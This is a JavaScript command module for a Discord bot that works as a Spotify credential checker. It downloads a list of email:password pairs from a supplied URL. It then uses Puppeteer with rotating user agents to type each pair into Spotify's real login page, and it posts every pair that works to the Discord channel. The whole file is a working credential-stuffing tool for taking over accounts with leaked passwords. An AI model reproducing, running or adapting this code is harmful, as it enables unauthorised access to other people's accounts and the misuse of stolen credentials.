const fs = require("fs");
const { RichEmbed } = require("discord.js");
const puppeteer = require("puppeteer");
const fetch = require("node-fetch");
const {
  getRootDir,
  getUserAgent,
  getRandomInt,
  ProgressText
} = require("../../utils");
const { prefix } = require("../../config");

const document = {};

const puppeteerOptions = {
  args: [
    "--disable-gpu",
    "--disable-dev-shm-usage",
    "--disable-setuid-sandbox",
    "--no-first-run",
    "--no-sandbox",
    "--no-zygote"
  ]
};

const getCredentials = url => fetch(url).then(res => res.text());

let error_count = 0;
let error_message = "";

const checkCredentials = async (
  { browser, credentials, message, msg },
  index,
  maxIndex
) => {
  try {
    if (index < credentials.length) {
      const URL = "https://accounts.spotify.com/en/login";
      const email = credentials[index].substring(
        0,
        credentials[index].indexOf(":")
      );
      const password = credentials[index].substring(
        credentials[index].indexOf(":") + 1
      );

      msg.edit(
        `Checking... (${index + 1}/${
          credentials.length
        })\n${email}:${password}\nError: ${error_count}\nMessage: \`${error_message}\``
      );

      const page = await browser.newPage();

      await page.setUserAgent(getUserAgent());
      await page.goto(URL, {
        waitUntil: "networkidle0"
      });
      await page.evaluate(() => {
        document.getElementById("login-username").value = "";
      });
      await page.focus("input[id=login-username]");
      await page.keyboard.type(email);
      await page.focus("input[id=login-password]");
      await page.keyboard.type(password);
      try {
        await page.waitFor(100);
        await page.click("button[id=login-button]");
      } catch (err) {
        // do nothing
      }
      await page.waitFor(3000);

      const isValid = await page.evaluate(() => {
        if (document.querySelector(".alert")) {
          return false;
        }

        if (document.querySelector(".user-details")) {
          document.querySelector(".btn-green").click();
          return true;
        }
      });

      if (isValid) {
        const embed = new RichEmbed()
          .setColor(`RANDOM`)
          .setDescription(`${email}:${password}`);

        message.channel.send(embed);
        await browser.close();
        const newBrowser = await puppeteer.launch(puppeteerOptions);
        checkCredentials(
          { browser: newBrowser, credentials, message, msg },
          index + 1,
          maxIndex
        );
      } else {
        await page.close();
        checkCredentials(
          { browser, credentials, message, msg },
          index + 1,
          maxIndex
        );
      }
    }
  } catch (err) {
    error_count++;
    // eslint-disable-next-line require-atomic-updates
    error_message = err;
    await browser.close();
    const newBrowser = await puppeteer.launch(puppeteerOptions);
    checkCredentials(
      { browser: newBrowser, credentials, message, msg },
      index + 1,
      maxIndex
    );
  }
};

module.exports = {
  name: "spotify-checker",
  aliases: ["sc"],
  description: "Check spotify accounts from a list",
  args: true,
  usage: `http://example.com/file.txt 1 12`,
  devOnly: true,
  async execute(message, args) {
    const initialIndex = parseInt(args[1], 10) || 0;
    const maxIndex = parseInt(args[1], 10) || 0;
    const textResult = await getCredentials(args[0]);
    const credentials = textResult
      .split("\n")
      .map(cred => {
        const thereIsSpace = cred.indexOf(" ") === -1;
        const lastIndex = thereIsSpace ? cred.length : cred.indexOf(" ");

        return cred.includes("@") && cred.substring(0, lastIndex);
      })
      .filter(val => !!val);

    const browser = await puppeteer.launch(puppeteerOptions);

    return message.channel.send("Please wait...").then(async msg => {
      await checkCredentials(
        {
          browser,
          credentials,
          message,
          msg
        },
        initialIndex,
        maxIndex
      );
    });
  }
};
